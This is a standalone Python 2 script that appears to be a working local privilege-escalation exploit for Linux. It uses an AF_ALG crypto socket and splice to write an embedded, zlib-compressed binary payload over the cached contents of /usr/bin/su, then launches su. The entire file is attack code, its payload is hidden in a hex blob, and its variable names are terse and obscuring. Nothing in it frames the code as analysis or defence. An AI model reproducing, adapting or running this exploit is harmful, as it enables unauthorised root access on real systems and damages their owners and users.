#!/usr/bin/env python2
# coding: utf-8

import os as g, zlib, socket as s
import ctypes

libc = ctypes.CDLL("libc.so.6", use_errno=True)
AF_ALG = 38
NR_SPLICE = 275

# Define sockaddr_alg structure matching kernel layout exactly
# struct sockaddr_alg {
#     __u16 salg_family;    // 2 bytes at offset 0
#     __u8  salg_type[14];  // 14 bytes at offset 2
#     __u32 salg_feat;      // 4 bytes at offset 16
#     __u32 salg_mask;      // 4 bytes at offset 20
#     __u8  salg_name[64];  // 64 bytes at offset 24
# };
class sockaddr_alg(ctypes.Structure):
    _fields_ = [
        ("family", ctypes.c_ushort),      # offset 0, 2 bytes
        ("type", ctypes.c_char * 14),     # offset 2, 14 bytes
        ("feat", ctypes.c_uint32),        # offset 16, 4 bytes
        ("mask", ctypes.c_uint32),        # offset 20, 4 bytes
        ("alg_name", ctypes.c_char * 64), # offset 24, 64 bytes
    ]

def d(x): 
    return x.decode('hex')

def splice(fd_in, fd_out, length, offset_src=0):
    off_in = ctypes.c_longlong(offset_src)
    off_out = ctypes.c_longlong(0)
    return libc.syscall(
        NR_SPLICE,
        ctypes.c_int(fd_in),
        ctypes.byref(off_in),
        ctypes.c_int(fd_out),
        ctypes.byref(off_out),
        ctypes.c_size_t(length),
        ctypes.c_uint(0)
    )

def af_alg_bind(sock_fd, sock_type, alg_name):
    """Bind an AF_ALG socket."""
    addr = sockaddr_alg()
    addr.family = AF_ALG
    addr.type = sock_type
    addr.feat = 0
    addr.mask = 0
    addr.alg_name = alg_name

    ret = libc.bind(
        ctypes.c_int(sock_fd),
        ctypes.byref(addr),
        ctypes.c_uint(ctypes.sizeof(addr))
    )

    if ret != 0:
        err = ctypes.get_errno()
        raise OSError("bind() failed errno=%d" % err)

    return ret

def af_alg_setsockopt(sock_fd, level, optname, optval):
    """AF_ALG setsockopt wrapper."""
    if optval is None:
        ptr = None
        length = 0
    else:
        buf = ctypes.create_string_buffer(optval)
        ptr = ctypes.cast(buf, ctypes.c_void_p)
        length = len(optval)

    ret = libc.setsockopt(
        ctypes.c_int(sock_fd),
        ctypes.c_int(level),
        ctypes.c_int(optname),
        ptr,
        ctypes.c_uint(length)
    )

    if ret != 0:
        err = ctypes.get_errno()
        raise OSError("setsockopt(level=%d, optname=%d) failed errno=%d" % (level, optname, err))

    return ret

def af_alg_accept(sock_fd):
    """Accept an AF_ALG operation socket."""
    fd = libc.accept(
        ctypes.c_int(sock_fd),
        None,
        None
    )

    if fd < 0:
        err = ctypes.get_errno()
        raise OSError("accept() failed errno=%d" % err)

    return fd

def c(f, t, c):
    a = s.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
    sock_fd = a.fileno()

    af_alg_bind(
        sock_fd,
        "aead",
        "authenc(hmac(sha256),cbc(aes))"
    )

    h = 279  # SOL_ALG

    af_alg_setsockopt(
        sock_fd,
        h,
        1,
        d('0800010000000010' + '0' * 64)
    )

    af_alg_setsockopt(
        sock_fd,
        h,
        5,
        d('00000000')
    )

    u_fd = af_alg_accept(sock_fd)
    u = s.fromfd(u_fd, 38, 5)

    o = t + 4
    i = d('00')

    u.send(b"A" * 4 + c)

    r, w = g.pipe()

    splice(f, w, o, offset_src=0)
    splice(r, u.fileno(), o)

    try:
        u.recv(8 + t)
    except:
        pass

f = g.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i < len(e):
    c(f, i, e[i:i+4])
    i += 4
g.system("su")
